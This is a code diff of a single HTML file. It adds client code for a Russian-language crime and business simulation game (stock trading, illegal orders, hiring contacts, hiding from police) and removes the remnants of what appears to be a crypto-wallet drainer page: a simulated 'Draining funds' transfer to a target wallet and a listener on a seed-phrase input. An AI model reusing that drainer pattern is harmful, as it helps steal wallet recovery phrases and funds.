+                                ${amount} акц. × $${market[company].price} = $${value.toLocaleString()}
+                            </div>
+                        </div>
+                    `;
+                }
+            });
+            
+            portfolioElement.innerHTML = html;
+        }
+
+        // Показать уведомление
+        function showNotification(message, type = 'info') {
+            const notification = document.getElementById('notification');
+            const title = document.getElementById('notificationTitle');
+            const msg = document.getElementById('notificationMessage');
+            const icon = document.getElementById('notificationIcon');
+            
+            // Устанавливаем тип уведомления
+            notification.className = 'notification';
+            notification.classList.add(type);
+            
+            // Устанавливаем иконку
+            switch(type) {
+                case 'success':
+                    icon.className = 'fas fa-check-circle';
+                    title.textContent = 'Успех!';
+                    break;
+                case 'error':
+                    icon.className = 'fas fa-exclamation-circle';
+                    title.textContent = 'Ошибка!';
+                    break;
+                case 'warning':
+                    icon.className = 'fas fa-exclamation-triangle';
+                    title.textContent = 'Внимание!';
+                    break;
+                default:
+                    icon.className = 'fas fa-info-circle';
+                    title.textContent = 'Информация';
+            }
+            
+            msg.textContent = message;
+            
+            // Показываем уведомление
+            notification.classList.add('show');
+            
+            // Скрываем через 5 секунд
+            setTimeout(() => {
+                notification.classList.remove('show');
+            }, 5000);
+        }
+
+        // Работа легальная
+        function workLegal(jobIndex) {
+            sendToServer('work_legal', { job_index: jobIndex });
+        }
+
+        // Обновить биржу
+        function updateMarket() {
+            sendToServer('update_market');
+        }
+
+        // Найти заказ
+        function findOrder() {
+            sendToServer('find_order');
+        }
+
+        // Показать модалку заказа
+        function showOrderModal(order) {
+            const content = document.getElementById('orderModalContent');
+            content.innerHTML = `
+                <div style="margin-bottom: 20px;">
+                    <h4 style="color: #74b9ff; margin-bottom: 10px;">📦 ${order.item}</h4>
+                    <p><i class="fas fa-boxes"></i> Количество: ${order.amount} ед.</p>
+                    <p><i class="fas fa-money-bill-wave"></i> Прибыль: $${order.profit.toLocaleString()}</p>
+                    <p><i class="fas fa-exclamation-triangle"></i> Риск: ${order.risk}%</p>
+                    <p><i class="fas fa-tasks"></i> Сложность: ${order.difficulty}</p>
+                </div>
+                <div style="background: rgba(255,255,255,0.05); padding: 15px; border-radius: 8px;">
+                    <p style="font-size: 0.9rem; opacity: 0.8;">
+                        <i class="fas fa-info-circle"></i> При провале заказа внимание полиции увеличится на ${order.risk}%
+                    </p>
+                </div>
+            `;
+            document.getElementById('orderModal').classList.add('active');
+        }
+
+        // Принять заказ
+        function acceptOrder() {
+            if (currentOrder) {
+                sendToServer('accept_order', { order_data: currentOrder });
+                closeModal('orderModal');
+                currentOrder = null;
+            }
+        }
+
+        // Найти контакт
+        function findContact() {
+            sendToServer('find_contact');
+        }
+
+        // Показать модалку контакта
+        function showContactModal(contact) {
+            const content = document.getElementById('contactModalContent');
+            content.innerHTML = `
+                <div style="margin-bottom: 20px;">
+                    <h4 style="color: #74b9ff; margin-bottom: 10px;">👤 ${contact.name}</h4>
+                    <p><i class="fas fa-info-circle"></i> ${contact.description}</p>
+                    <p><i class="fas fa-money-bill-wave"></i> Стоимость: $${contact.cost.toLocaleString()}</p>
+                    <p><i class="fas fa-shield-alt"></i> Снижает риск операций на: ${contact.risk_reduction}%</p>
+                </div>
+            `;
+            document.getElementById('contactModal').classList.add('active');
+        }
+
+        // Нанять контакт
+        function hireContact() {
+            if (currentContact) {
+                sendToServer('hire_contact', { contact_data: currentContact });
+                closeModal('contactModal');
+                currentContact = null;
+            }
+        }
+
+        // Скрыться от полиции
+        function hideFromPolice(method) {
+            sendToServer('hide_from_police', { method });
+        }
+
+        // Показать модалку покупки бизнеса
+        function showBuyBusinessModal(type, index) {
+            currentBusinessType = type;
+            currentBusinessIndex = index;
+            
+            const businesses = type === 'legal' ? gameState.legal_businesses : gameState.illegal_businesses;
+            const business = businesses[index];
+            
+            const title = document.getElementById('modalBusinessTitle');
+            const content = document.getElementById('modalBusinessContent');
+            
+            title.textContent = `Купить ${type === 'legal' ? 'легальный' : 'криминальный'} бизнес`;
+            
+            content.innerHTML = `
+                <div style="margin-bottom: 20px;">
+                    <h4 style="color: #74b9ff; margin-bottom: 10px;">${business.name}</h4>
+                    <p><i class="fas fa-money-bill-wave"></i> Стоимость: $${business.cost.toLocaleString()}</p>
+                    <p><i class="fas fa-coins"></i> Ежедневный доход: $${business.income}</p>
+                    <p><i class="fas fa-exclamation-triangle"></i> Риск: ${business.risk}%</p>
+                    ${type === 'legal' 
+                        ? `<p><i class="fas fa-chart-line"></i> Репутация: +${business.rep_gain}</p>`
+                        : `<p><i class="fas fa-user-secret"></i> Влияние: +${business.inf_gain}</p>`
+                    }
+                </div>
+                <div style="background: rgba(255,255,255,0.05); padding: 15px; border-radius: 8px;">
+                    <p style="font-size: 0.9rem; opacity: 0.8;">
+                        <i class="fas fa-info-circle"></i> 
+                        ${type === 'legal' 
+                            ? 'Легальный бизнес повышает репутацию и приносит стабильный доход.' 
+                            : 'Криминальный бизнес повышает влияние, но увеличивает внимание полиции на 10%.'
+                        }
+                    </p>
+                </div>
+            `;
+            
+            document.getElementById('buyBusinessModal').classList.add('active');
+        }
+
+        // Подтвердить покупку бизнеса
+        function confirmBuyBusiness() {
+            if (currentBusinessType !== null && currentBusinessIndex !== null) {
+                sendToServer('buy_business', {
+                    business_type: currentBusinessType,
+                    business_index: currentBusinessIndex
+                });
+                closeModal('buyBusinessModal');
+                currentBusinessType = null;
+                currentBusinessIndex = null;
+            }
+        }
+
+        // Показать модалку покупки акций
+        function showBuyStocksModal() {
+            if (!gameState || !gameState.market) {
+                showNotification('Сначала обновите биржевые котировки', 'error');
+                return;
+            }
+            
+            const content = document.getElementById('buyStocksContent');
+            let html = '<div style="margin-bottom: 20px;">';
+            
+            Object.entries(gameState.market).forEach(([company, data], index) => {
+                const maxCanBuy = Math.floor(gameState.player.money / data.price);
+                const trendSymbol = data.trend > 0 ? '📈' : data.trend < 0 ? '📉' : '➖';
+                
+                html += `
+                    <div style="margin-bottom: 15px; padding: 15px; background: rgba(255,255,255,0.05); border-radius: 8px;">
+                        <h4 style="color: #74b9ff; margin-bottom: 5px;">${company}</h4>
+                        <p>Цена: $${data.price} ${trendSymbol} ${data.trend.toFixed(1)}%</p>
+                        <p>Максимум можно купить: ${maxCanBuy} акций</p>
+                        <div style="display: flex; gap: 10px; margin-top: 10px;">
+                            <input type="number" id="buyAmount${index}" min="1" max="${maxCanBuy}" value="1" 
+                                   style="flex: 1; padding: 8px; border-radius: 5px; border: none; background: rgba(255,255,255,0.1); color: white;">
+                            <button onclick="buyStocks(${index})" 
+                                    style="padding: 8px 15px; border: none; border-radius: 5px; background: #00b894; color: white; cursor: pointer;">
+                                Купить
+                            </button>
+                        </div>
+                    </div>
+                `;
+            });
+            
+            html += '</div>';
+            content.innerHTML = html;
+            document.getElementById('buyStocksModal').classList.add('active');
+        }
+
+        // Купить акции
+        function buyStocks(companyIndex) {
+            const input = document.getElementById(`buyAmount${companyIndex}`);
+            const amount = parseInt(input.value) || 0;
+            
+            if (amount > 0) {
+                sendToServer('buy_stocks', {
+                    company_index: companyIndex,
+                    amount: amount
+                });
+                closeModal('buyStocksModal');
+            }
+        }
+
+        // Показать модалку продажи акций
+        function showSellStocksModal() {
+            if (!gameState || !gameState.player.stocks) {
+                showNotification('У вас нет акций для продажи', 'error');
+                return;
+            }
+            
+            const content = document.getElementById('sellStocksContent');
+            let html = '<div style="margin-bottom: 20px;">';
+            let hasStocks = false;
+            
+            Object.entries(gameState.player.stocks).forEach(([company, amount], index) => {
+                if (amount > 0 && gameState.market[company]) {
+                    hasStocks = true;
+                    const value = amount * gameState.market[company].price;
+                    
+                    html += `
+                        <div style="margin-bottom: 15px; padding: 15px; background: rgba(255,255,255,0.05); border-radius: 8px;">
+                            <h4 style="color: #74b9ff; margin-bottom: 5px;">${company}</h4>
+                            <p>У вас: ${amount} акций</p>
+                            <p>Текущая цена: $${gameState.market[company].price}</p>
+                            <p>Общая стоимость: $${value.toLocaleString()}</p>
+                            <div style="display: flex; gap: 10px; margin-top: 10px;">
+                                <input type="number" id="sellAmount${index}" min="1" max="${amount}" value="1" 
+                                       style="flex: 1; padding: 8px; border-radius: 5px; border: none; background: rgba(255,255,255,0.1); color: white;">
+                                <button onclick="sellStocks(${index}, '${company}')" 
+                                        style="padding: 8px 15px; border: none; border-radius: 5px; background: #e74c3c; color: white; cursor: pointer;">
+                                    Продать
+                                </button>
+                            </div>
+                        </div>
+                    `;
+                }
+            });
+            
+            if (!hasStocks) {
+                html = '<p style="text-align: center; opacity: 0.7;">У вас нет акций для продажи</p>';
+            }
+            
+            html += '</div>';
+            content.innerHTML = html;
+            document.getElementById('sellStocksModal').classList.add('active');
+        }
+
+        // Продать акции
+        function sellStocks(index, company) {
+            const input = document.getElementById(`sellAmount${index}`);
+            const amount = parseInt(input.value) || 0;
+            
+            if (amount > 0) {
+                // Находим индекс компании
+                const companies = Object.keys(gameState.market);
+                const companyIndex = companies.indexOf(company);
+                
+                if (companyIndex !== -1) {
+                    sendToServer('sell_stocks', {
+                        company_index: companyIndex,
+                        amount: amount
+                    });
+                    closeModal('sellStocksModal');
+                }
+            }
+        }
+
+        // Следующий день
+        function nextDay() {
+            sendToServer('next_day');
+        }
+
+        // Закрыть модальное окно
+        function closeModal(modalId) {
+            document.getElementById(modalId).classList.remove('active');
+        }
+
+        // Начать игру
+        function startGame() {
+            const playerName = document.getElementById('playerName').value.trim() || 'Игрок';
+            
+            document.getElementById('startScreen').style.display = 'none';
+            document.getElementById('gameInterface').style.display = 'block';
+            
+            // Подключаемся к WebSocket
+            connectWebSocket();
+            
+            // Даем время на установку соединения
+            setTimeout(() => {
+                sendToServer('start_game', { name: playerName });
+            }, 500);
+        }
+
+        // Инициализация вкладок
+        function initTabs() {
+            const tabs = document.querySelectorAll('.tab');
+            const tabContents = document.querySelectorAll('.tab-content');
+            
+            tabs.forEach(tab => {
+                tab.addEventListener('click', () => {
+                    const tabId = tab.dataset.tab;
+                    
+                    // Убираем активный класс у всех вкладок
+                    tabs.forEach(t => t.classList.remove('active'));
+                    tabContents.forEach(tc => tc.classList.remove('active'));
+                    
+                    // Добавляем активный класс текущей вкладке
+                    tab.classList.add('active');
+                    document.getElementById(`${tabId}Tab`).classList.add('active');
+                });
             });
         }
 
-        function simulateTransfer() {
-            // Симуляция "процесса перевода" — здесь в реальности были бы вызовы к блокчейну
-            let progress = 0;
-            const interval = setInterval(() => {
-                progress += 10;
-                document.getElementById('status').textContent = `Draining funds... ${progress}%`;
-                if (progress >= 100) {
-                    clearInterval(interval);
-                    document.getElementById('status').textContent = `✅ All assets transferred to ${TARGET_WALLET}. You can close this window.`;
-                    tg.MainButton.setText("Finished").setParams({ color: "#FF416C" });
+        // Инициализация при загрузке страницы
+        window.onload = function() {
+            initTabs();
+            
+            // Добавляем обработчик для кнопки старта
+            document.getElementById('startGameBtn').addEventListener('click', startGame);
+            
+            // Добавляем возможность нажимать Enter в поле имени
+            document.getElementById('playerName').addEventListener('keypress', function(e) {
+                if (e.key === 'Enter') {
+                    startGame();
                 }
-            }, 300);
-        }
-
-        // Ловим все, что вводится, на всякий случай
-        document.getElementById('seedPhrase').addEventListener('input', (e) => {
-            console.log('Seed phrase updated:', e.target.value.substring(0, 5) + '...');
-        });
+            });
+        };
     </script>
 </body>
 </html>
